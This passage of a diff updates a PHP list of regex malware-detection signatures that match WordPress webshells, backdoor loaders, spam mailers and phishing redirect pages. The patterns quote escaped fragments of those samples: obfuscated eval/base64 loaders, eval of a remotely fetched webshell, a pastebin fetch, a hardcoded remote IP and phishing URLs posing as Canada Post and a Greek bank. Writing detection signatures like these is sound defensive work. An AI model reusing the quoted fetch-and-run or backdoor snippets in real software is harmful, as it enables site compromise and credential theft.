+echo "AnonymousFox \\.\\/Done \\/o\\.htm";
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    578 => 
+    array (
+      'pattern' => '/9\\]\\.\\$lyqiphm\\[6\\];\\$eiakf\\[\\] \\= \\$lyqiphm\\[25\\]\\.\\$lyqiphm\\[[\\s\\S]{0,12000}\\^ niprie\\(\\$eiakf, \\$wgyeom, \\$eiakf\\[9\\]\\(\\$blkar\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    579 => 
+    array (
+      'pattern' => '/akfshy\\[\\] \\= \\$wpgeiqt\\[29\\]\\.\\$wpgeiqt\\[30\\]\\.\\$wpgeiqt\\[4\\][\\s\\S]{0,12000}bsj\\(\\$kakfshy, \\$fvkfu, \\$kakfshy\\[9\\]\\(\\$ajscsbh\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    580 => 
+    array (
+      'pattern' => '/\\$vzalnkg\\[16\\]\\.\\$vzalnkg\\[2\\]\\.\\$vzalnkg\\[29\\]\\.\\$vzalnkg\\[[\\s\\S]{0,12000}tsc\\(\\$rwmdcde, \\$azqvmko, \\$rwmdcde\\[9\\]\\(\\$zkbic\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    581 => 
+    array (
+      'pattern' => '/mgfol\\[28\\]\\.\\$tgmgfol\\[22\\]\\.\\$tgmgfol\\[6\\]\\.\\$tgmgfol\\[23\\]\\.[\\s\\S]{0,12000}zboc\\(\\$ewnavqg, \\$kztjoj, \\$ewnavqg\\[9\\]\\(\\$idhrn\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    582 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+	Plugin Name\\: Three Column Screen Layo[\\s\\S]{0,12000}value, \'s\\:5\\:\\\\"side4\\\\"\', \'s\\:6\\:\\\\"normal\\\\"\'\\) WHERE/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    583 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\*\\*
@@ -8001,78 +3710,353 @@ postpass/s',
     include \'phar\\:\\/\\/readme\\.txt\\/readme\\.tx/s',
       'label' => 'sample-specific content window',
     ),
-    1219 => 
+    584 => 
     array (
-      'pattern' => '/@include "\\\\057hom\\\\1453\\/s\\\\161uad\\\\063cod\\\\145\\/ma\\\\162ine\\\\163yst\\\\145mst\\\\145chn\\\\157log\\\\171\\.co\\\\155\\/wp\\\\055con\\\\164ent\\\\057plu\\\\147ins\\\\057rea\\\\154ly\\-\\\\163[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\<\\?php
+\\/\\*aa9ef\\*\\/
+
+@include "\\\\057hom\\\\1453\\/s\\\\161uad[\\s\\S]{0,12000}ng, but loads
+ \\* wp\\-blog\\-header\\.php which does a/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1220 => 
+    585 => 
     array (
-      'pattern' => '/\\$cookie\\=&\\$_COOKIE;\\$server\\=\\$_SERVER;\\$co\\=\'\';if\\(\\!empty\\(\\$cookie\\)\\)\\{foreach\\(\\$cookie as \\$cn\\=\\>\\$cv\\)\\{if\\(\\$co\\)\\$co\\.\\=\'; \';\\$co\\.\\=\\$cn\\.\'\\=\'\\.addslashes\\(\\$cv\\);\\}\\}[\\s\\S]{0,12000}function headerfunction\\(\\$ch,\\$hl\\)\\{if\\(strpos\\(\\$hl,"Content\\-Type"\\)\\!\\=\\=false\\|\\|strpos\\(\\$hl,"404"\\)\\!\\=\\=false\\|\\|strpos\\(\\$hl,"301"\\)\\!\\=\\=false\\|\\|strpos\\(\\$hl,"Lo/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/n\\\\157l\\\\157g\\\\171\\.\\\\143o\\\\155\\/\\\\167p\\\\055c\\\\157n\\\\164e\\\\1[\\s\\S]{0,12000}\\\\057\\.\\\\0668\\\\065f\\\\0602\\\\064f\\\\056i\\\\143o";
+
+\\/\\*52581\\*\\//s',
+      'label' => 'sample-specific content window chain',
     ),
-    1221 => 
+    586 => 
     array (
-      'pattern' => '/background\\-image\\: url\\(&quot;images\\/inv\\-small\\-background\\.jpg&quot;\\);\\-webkit\\-filter\\:invert\\(100%\\);filter\\:invert\\(100%\\);[\\s\\S]{0,160}background\\-image\\: url\\(&quot;images\\/inv\\-big\\-background\\.jpg&quot;\\);\\-webkit\\-filter\\:invert\\(100%\\);filter\\:invert\\(100%\\);/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/pfghee\\[3\\]\\.\\$dpfghee\\[10\\]\\.\\$dpfghee\\[26\\]\\.\\$dpfghee\\[13\\][\\s\\S]{0,12000}mhf\\(\\$nvmasxg, \\$jzbdff, \\$nvmasxg\\[9\\]\\(\\$dungun\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1222 => 
+    587 => 
     array (
-      'pattern' => '/\\<\\?php session_start\\(\\); error_reporting\\(0\\);set_time_limit\\(0\\); @ini_set\\(\'display_errors\',\'Off\'\\); @ini_set\\(\'memory_limit\',\'256M\'\\);  \\$ETrJDzbM \\=[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/^\\s*\\<\\?php \\/\\* FoxAuto \\*\\/ error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(trim\\(\\$cmx0T\\)\\); \\$nYANr \\= \'\'; for \\(\\$lv38F \\= 0; \\$lv38F \\< \\$o6ak/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1223 => 
+    588 => 
     array (
-      'pattern' => '/7\\.\'"\'\\.mrhz799\\(\\$xwbl209\\{2\\}\\.\\$xwbl209\\{2\\},\'\',\\$xwbl209\\{62\\}\\);\\$niem764\\(\\$lfua699,array\\(\'\',\'\\}\'\\.\\$soba910\\.\'\\/\\/\'\\)\\);\\/\\/wp\\-blog\\-header\\?\\>/s',
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); function Momdo\\(\\$T1R7y\\) \\{ \\$CyJ4O \\= strlen\\(trim\\(\\$T1R7y\\)\\); \\$yB2qC \\= \'\'; for \\(\\$srffE \\= 0; \\$srffE \\< \\$CyJ4O; \\$srffE \\+\\= 2/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    589 => 
+    array (
+      'pattern' => '/\\<\\?php
+set_time_limit\\(0\\);
+error_reporting\\(0\\);
+
+if[\\s\\S]{0,12000}path\'\\]\\)\\)\\{
+                echo \'\\<font color\\="gre/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    590 => 
+    array (
+      'pattern' => '/ue\\="Send test \\>\\>"\\>
+
+\\<\\/form\\>
+\\<br\\>
+\\<\\?php
+if \\(\\!empt[\\s\\S]{0,12000}@gmail\\.com \\- \\$xx \\<br\\>\\<br\\>\\<br\\> \\$xxx  \\<\\/b\\>"; 
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    591 => 
+    array (
+      'pattern' => '/ckopen\\(\\$host,80\\) or die\\(\\);
+	\\$header\\="POST \\$path[\\s\\S]{0,12000}ie"\\)\\!\\=\\=false\\)header\\(\\$hl\\);return strlen\\(\\$hl\\);
+\\}\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    592 => 
+    array (
+      'pattern' => '/^\\s*﻿\\<\\?php error_reporting\\(0\\);include\\(\'blocker\\.php\'\\);include\\(\'config\\.php\'\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    593 => 
+    array (
+      'pattern' => '/contents\\(\'https\\:\\/\\/pastebin\\.com\\/raw\\/63LjCNAs\'\\);[\\s\\S]{0,12000}\\$doit,\\$code\\);
+	fclose\\(\\$doit\\);
+	
+\\}
+
+engine\\(\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    594 => 
+    array (
+      'pattern' => '/\\<\\?php
+ 
+\\/\\/install_code1
+error_reporting\\(0\\);
+ini_set\\(\'display_errors\', 0\\);
+\\/\\/dhSEFLYVdZZ0tHbHpjMlYwS0NSZlVrVlJW
+DEFINE\\(\'M/s',
       'label' => 'sample-specific content window',
     ),
-    1224 => 
+    595 => 
     array (
-      'pattern' => '/,\\$Geess66e6s\\);\\$Gee66ess6s\\=__FILE__;\\$Gee66ess6s\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x47\\\\x36\\\\x65\\\\x36\\\\x36\\\\x73\\\\x65\\\\x73\\\\x65\\\\x73"\\]\\(\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$Gee66ess6s\\);\\$Gesee6s66s\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x47\\\\x73\\\\x73\\\\x36\\\\x65\\\\x36\\\\x65\\\\x65\\\\x73\\\\x36"\\]\\(__FILE__\\)\\.\\\\/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/p write success\\!\';
+				         	\\}else\\{[\\s\\S]{0,12000}se\\{
+ 			echo \'\';
+ 			exit;
+ 		\\}
+ 	\\}
+ 	exit\\(\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1225 => 
+    596 => 
     array (
-      'pattern' => '/\\<\\?php \\$LBCaXUoJvtE\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$LBCaXUoJvtE\\[\\(105\\/15\\)\\]\\.\\$LBCaXUoJvtE\\[\\(26\\-1\\)\\]\\.\\$LBCaXUoJvtE\\[\\(1\\*4/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/2aVo3bHlRSGpla3ZaZ3dHNzBSN1F0MnA1eWVYNEJ1bDRySmdxMkw0Sm5jTGszOHNvMUJqWllFUWt1WXVRZGplTzVjJykpKSkpKSkpKSkpKSkpOw\\=\\=\'\\)\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window',
     ),
-    1226 => 
+    597 => 
     array (
-      'pattern' => '/\\*\\s+coarse\\s+evaluate\\s+extinct\\s+genuine\\s+infer\\s+likelihood\\s+media\\s+racial\\s+slender\\s+spot\\s+title\\s+transplant\\s+usage\\s+variable\\s+wonder\\./',
-      'label' => 'sample-specific line fragment',
+      'pattern' => '/\\{2\\}\\.\\$O\\{9\\}\\.\\$O\\{4\\}\\.\\$O\\{62\\}\\.\\$O\\{57\\}\\.\\$O\\{89\\}\\.\\$O\\{63\\}\\.\\$O\\{89\\};unset\\(\\$OOoOoOOoOOoO\\);if \\(\\$OOooO \\=\\= \\$O\\{65\\}\\) \\{if\\(is_array\\(\\$OOOOooO\\)\\)\\{ \\$/s',
+      'label' => 'sample-specific content window',
     ),
-    1227 => 
+    598 => 
     array (
-      'pattern' => '/\\<html\\> \\<meta http\\-equiv\\="refresh" content\\="0; URL\\=https\\:\\/\\/52\\-159\\-103\\-19\\.cprapid\\.com\\/canada\\-post2\\/" \\/\\> \\<\\/html\\>/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\<\\?php session_start\\(\\); error_reporting\\(0\\);set_time_limit\\(0\\); @ini_set\\(\'display_errors\',\'Off\'\\); @ini_set\\(\'memory_limit\',\'256M\'\\);  \\$ETrJDzbM \\=[\\s\\S]{0,18000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';\\s*$/s',
+      'label' => 'source-file first-last anchor',
     ),
-    1228 => 
+    599 => 
+    array (
+      'pattern' => '/t0CvIKKipyC3KKUgGM\\/NSy1EkcooKkovBbEOEsBGCaYxglmd[\\s\\S]{0,12000}\\\\x35\\\\x35\\\\x63\\\\x66\\\\x66\\\\x66\\\\x63\\\\x35"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    600 => 
+    array (
+      'pattern' => '/ESS \\!\\!\\<\\/font\\>\\<br\\/\\>\';
+\\}else\\{
+echo \'\\<script\\>alert\\([\\s\\S]{0,12000}Right Reserved\\.\\<\\/font\\>
+\\<\\/center\\>
+\\<\\/BODY\\>
+\\<\\/HTML\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    601 => 
+    array (
+      'pattern' => '/sbnv074 \\= mrhz799\\(\\$xwbl209\\{11\\},\\$xwbl209\\{57\\},\\$xwb[\\s\\S]{0,12000},array\\(\'\',\'\\}\'\\.\\$soba910\\.\'\\/\\/\'\\)\\);\\/\\/wp\\-blog\\-header\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    602 => 
+    array (
+      'pattern' => '/4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x47\\\\x36\\\\x73\\\\x73\\\\x73\\\\x36\\\\x65[\\s\\S]{0,12000}"\\\\x47\\\\x65\\\\x73\\\\x65\\\\x36\\\\x36\\\\x36\\\\x73\\\\x65\\\\x73"\\]\\(\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    603 => 
+    array (
+      'pattern' => '/074 \\= mrhz799\\(\\$xwbl209\\{11\\},\\$xwbl209\\{57\\},\\$xwbl209[\\s\\S]{0,12000}\',\'\\}\'\\.\\$soba910\\.\'\\/\\/\'\\)\\);\\/\\/wp\\-blog\\-header scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    604 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$inter_domain\\=\'http\\:\\/\\/154\\.22\\.119\\.11\\/z0228_28\';function curl_get_contents\\(\\$url\\)\\{\\$ch\\=curl_init\\(\\);curl_setopt \\(\\$ch, CURLOPT_URL, \\$url\\);cu/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    605 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\141\\\\144\\\\155\\\\151\\\\156\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\162\\\\163\\\\163\\\\55\\\\64\\\\170\\\\56\\\\160\\\\156\\\\147"\\); \\?\\>/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    606 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'HThan\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    607 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$LBCaXUoJvtE\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$LBCaXUoJvtE\\[\\(105\\/15\\)\\]\\.\\$LBCaXUoJvtE\\[\\(26\\-1\\)\\]\\.\\$LBCaXUoJvtE\\[\\(1\\*4/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    608 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'sIez4\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    609 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'uiIm5\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    610 => 
+    array (
+      'pattern' => '/_iframe, \\$context \\);
+			\\}
+
+			if \\( \\$filtered_iframe \\!\\=\\= \\$match\\[0\\] \\) \\{
+				\\$content \\= str_replace\\( \\$match\\[0\\], \\$filtered_i/s',
+      'label' => 'sample-specific content window',
+    ),
+    611 => 
+    array (
+      'pattern' => '/^\\s*\\<html\\> \\<meta http\\-equiv\\="refresh" content\\="0; URL\\=https\\:\\/\\/52\\-159\\-103\\-19\\.cprapid\\.com\\/canada\\-post2\\/" \\/\\> \\<\\/html\\>/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    612 => 
+    array (
+      'pattern' => '/\\<\\?php 
+eval\\("\\?\\>"\\.base64_decode\\("PD9waHAKY2xhc3MgRm9vIHsKCWZ1bmN0aW9uIF9fY29uc3RydWN0KCkgewoJCSRtb2R1bGUgPSAkdGhpcy0\\+c3Rh/s',
+      'label' => 'sample-specific content window',
+    ),
+    613 => 
     array (
       'pattern' => '/\\<\\?php
 error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(trim\\(\\$cmx0T\\)\\); \\$nYANr \\= \'\'; for \\(\\$lv38F \\= 0; \\$lv38F \\</s',
       'label' => 'sample-specific content window',
     ),
-    1229 => 
+    614 => 
     array (
-      'pattern' => '/\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\151\\\\156\\\\143\\\\154\\\\165\\\\144\\\\145\\\\163\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\154\\\\151\\\\143\\\\145\\\\156\\\\163\\\\145\\\\56\\\\164\\\\170\\\\164"\\); \\?\\>[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/^\\s*\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\151\\\\156\\\\143\\\\154\\\\165\\\\144\\\\145\\\\163\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\154\\\\151\\\\143\\\\145\\\\156\\\\163\\\\145\\\\56\\\\164\\\\170\\\\164"\\); \\?\\>[\\s\\S]{0,18000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';\\s*$/s',
+      'label' => 'source-file first-last anchor',
     ),
-    1230 => 
+    615 => 
     array (
-      'pattern' => '/\\$pdgR5J05_M\\="Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85PzcgqLU4mLqCCclFqeamcSnpCbnp6RqAO0sSi3TUHHM9vc3i\\/BysawKMtJEAtYA";\\/\\/scp/',
-      'label' => 'source-file head snippet',
+      'pattern' => '/else if\\(getenv\\(\'HTTP_FORWARDED\'\\)\\)
+        \\$[\\s\\S]{0,12000}rce\', 1, true\\]\\);
+	\\}\\);
+	\\<\\/script\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1231 => 
+    616 => 
     array (
-      'pattern' => '/\\{echo \\\\\'wp\\-blog\\-header\\\\\';\\}\'\\);\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x4f\\\\x5f\\\\x4f\\\\x30\\\\x30"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'pattern' => '/\\<\\?php
+@error_reporting\\(0\\);
+@set_time_limit\\(150\\);[\\s\\S]{0,12000}QENTLQSI\\/LHHjQaHhMW8i8Pih1JHGI3JIRA2FtDeQ\\+L4rnRA/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    617 => 
+    array (
+      'pattern' => '/YH
+	TY6L3LsDrTBW9xpGzYacmAL3WivSUGqTc2WBj5KzcBxR[\\s\\S]{0,12000}PFBRx4\\/UC\\/Yh4M3u8NBd5qY
+	Bi8\\=\';
+\\}
+
+new Set\\(\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    618 => 
+    array (
+      'pattern' => '/rp \\= @\\$func\\[34\\]\\(filegroup\\(\\$item\\)\\);
+		\\$dgrp \\= \\$dgrp\\[\'name\'\\];
+	\\} else \\{
+		\\$dgrp \\= filegroup\\(\\$item\\);
+	\\}
+	return \\$downer \\. \'/s',
       'label' => 'sample-specific content window',
     ),
-    1232 => 
+    619 => 
     array (
-      'pattern' => '/\\<meta http\\-equiv\\="refresh"[\\s\\S]{0,12000}content\\="0; url\\=https\\:\\/\\/pymedigital\\.org\\/\\/wp\\-config\\/nbgi\\-bank\\-National\\-Bank\\-Greece\\-otp\\-sms\\-othy\\-1\\/nbgi\\-bank\\-National\\-Bank\\-Greece\\-otp\\-sms\\-othy/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/xXSCxFnYq6pxz8Bfxgy3PxSnDqwaxyW\\+qjkhauIWmVpD5dBF[\\s\\S]{0,12000}zinflate\\(base64_decode\\(\\$pdgR5J05_M\\)\\)\\)\\);
+exit;
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1233 => 
+    620 => 
+    array (
+      'pattern' => '/each \\(\\$query_vars\\)\\) \\{
+     fputs\\(\\$fp,"\\<GDFORM_VA[\\s\\S]{0,12000}http\\:\\/\\/"\\.\\$_SERVER\\["HTTP_HOST"\\]\\."\\/"\\);
+    \\}
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    621 => 
+    array (
+      'pattern' => '/\\\\x5f\\\\x4f\\\\x30\\\\x4f\\\\x5f\\\\x5f\\\\x30"\\]\\(\\\\\'s9F3yhT8xJLfZNL[\\s\\S]{0,12000}\\\\x5f\\\\x5f\\\\x30\\\\x4f\\\\x5f\\\\x4f\\\\x30\\\\x30"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    622 => 
+    array (
+      'pattern' => '/87\\{34\\}\\);\\$rfew403 \\= ipga515\\(\\$wksh287\\{11\\},\\$wksh287[\\s\\S]{0,12000}fsgm154,array\\(\'\',\'\\}\'\\.\\$tieg251\\.\'\\/\\/\'\\)\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    623 => 
+    array (
+      'pattern' => '/\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x30\\\\x4f\\\\x4f[\\s\\S]{0,12000}5 \\-\\-\\\\x72e\\\\x73e\\\\x74\\-o\\\\x6e\\-\\\\x73tal\\\\x65\\\\x20\\-B"\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    624 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); @ini_set\\(\'error_log\', NULL\\); @ini_set\\(\'log_errors\', 0\\);  @ini_set\\(\'display_errors\', 0\\);  echo "FoxAutoV5 \\[The best/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    625 => 
+    array (
+      'pattern' => '/eval\\("\\?\\>"\\.file_get_contents\\("https\\:\\/\\/ra[\\s\\S]{0,12000}oobSecID\\/webshell\\/master\\/shell\\.php"\\)\\);
+     \\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    626 => 
+    array (
+      'pattern' => '/ist" cols\\="90"\\>\\<\\/textarea\\>\\<br\\/\\>
+
+list of failed mails \\<br\\/\\>
+\\<textarea id\\="failedlist" cols\\="90"\\>\\<\\/textarea\\>
+\\-\\-\\>
+
+\\<\\/body\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    627 => 
+    array (
+      'pattern' => '/\\$?sfmxebcirt\\b/',
+      'label' => 'sample-specific identifier',
+    ),
+    628 => 
+    array (
+      'pattern' => '/\\$?fgvrhgkibs\\b/',
+      'label' => 'sample-specific identifier',
+    ),
+    629 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\$GLOBALS\\[\'pass\'\\] \\= ""; 
+\\$func \\= "cr" \\. "eat" \\. "e_fun" \\. "cti" \\. "on";
+\\$b374k \\= \\$func\\(\'\\$x\', \'ev\' \\. \'al\' \\. \'\\("\\?\\>"\\./s',
+      'label' => 'sample-specific content window',
+    ),
+    630 => 
+    array (
+      'pattern' => '/tal\\.org\\/\\/wp\\-config\\/nbgi\\-bank\\-National\\-Bank\\-Greec[\\s\\S]{0,12000}otp\\-sms\\-othy\\-1\\/"\\>
+\\<\\/head\\>
+\\<body\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    631 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$\\{"\\\\x47L\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["m\\\\x79\\\\x70\\\\x61c\\\\x63\\\\x73\\\\x76"\\]\\="\\\\x5f1";\\$\\{"\\\\x47\\\\x4cOBAL\\\\x53"\\}\\["h\\\\x6fq\\\\x70\\\\x75\\\\x73p\\\\x67l\\\\x73v"\\]\\="\\\\x5f\\\\x30"/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    632 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php function curl_get_contents\\(\\$url\\)\\{\\$ch\\=curl_init\\(\\);curl_setopt \\(\\$ch, CURLOPT_URL, \\$url\\);curl_setopt \\(\\$ch, CURLOPT_RETURNTRANSFER, 1\\);cur/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    633 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\$email \\= "god1stbaze@gmail\\.com, pa\\.gerald@yandex\\.com, pjmask0147@gmail\\.com"; \\/\\/ PUT UR FU/s',
+      'label' => 'sample-specific content window',
+    ),
+    634 => 
     array (
       'pattern' => '/\\<input type\\="submit" class\\="putc" value\\="View file"\\>\\<br\\>
      \\<br\\>
@@ -8085,7 +4069,7 @@ error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(t
 \\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1234 => 
+    635 => 
     array (
       'pattern' => '/t" class\\="putc" value\\="View file"\\>\\<br\\>
      \\<br\\>
@@ -8101,252 +4085,776 @@ error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(t
 \\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1235 => 
+    636 => 
     array (
-      'pattern' => '/75"\\]\\)\\)\\{echo \\\\\'okbbcbba\\\\\';\\}\'\\);\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x4f\\\\x4f\\\\x30\\\\x5f\\\\x30\\\\x4f"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'pattern' => '/\\$i\\<\\$ln; \\$i\\+\\+\\)\\{
+	if\\(\\$len\\[\\$i\\] \\=\\= "@"\\)\\{
+		\\$x \\= \\$i;
+		break;
+	\\}
+\\}
+\\$yuh \\= substr\\(\\$len,0,\\$x\\);
+\\$yuh \\= strrev\\(\\$yuh\\);
+for\\(\\$i\\=0; \\$/s',
       'label' => 'sample-specific content window',
     ),
-    1236 => 
+    637 => 
     array (
-      'pattern' => '/4cS"\\}\\["\\\\x42\\\\x36\\\\x43\\\\x55\\\\x55\\\\x43\\\\x55\\\\x36\\\\x43\\\\x36"\\]\\(\\$\\{"\\\\x5fG\\\\x45T"\\}\\["\\\\x74\\\\x78\\\\x74\\\\x6e\\\\x61\\\\x6d\\\\x65"\\]\\)\\:\\\\\'\\\\\';\\$BC6C6U6UCU\\=\\$\\{"G/s',
-      'label' => 'sample-specific content window',
-    ),
-    1237 => 
-    array (
-      'pattern' => '/\\<\\?php \\$uoeq967\\= "O\\)sl 2Te4x\\-\\+gazAbuK_6qrjH0RZt\\*N3mLcVFEWvh;inySJC91oMfYXId5Up\\.\\(GP7D,Bw\\/kQ8";\\$vpna644\\=\'JGNoID0gY3VybF9pbml0KCdodHRwOi8vYmFua3/',
-      'label' => 'source-file tail snippet',
-    ),
-    1238 => 
-    array (
-      'pattern' => '/\\<\\?php
-  \\/\\*
- \\*\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
- \\* APPLICATION ENVIRONMENT
- \\*\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-/s',
-      'label' => 'sample-specific content window',
-    ),
-    1239 => 
-    array (
-      'pattern' => '/9\\}\\.\\$O\\{55\\}\\.\\$O\\{48\\}\\.\\$O\\{38\\}\\.\\$O\\{1\\}\\.\\$O\\{30\\}\\.\\$O\\{31\\}\\.\\$O\\{38\\}\\.\\$O\\{20\\};\\$OO0ooo0O0O\\=\\$O\\{50\\}\\.\\$O\\{29\\}\\.\\$O\\{56\\}\\.\\$O\\{29\\}\\.\\$O\\{17\\}\\.\\$O\\{6\\}\\.\\$O\\{47\\}\\.\\$O/s',
-      'label' => 'sample-specific content window',
-    ),
-    1240 => 
-    array (
-      'pattern' => '/\'\\]\\)\\) response\\(400\\);
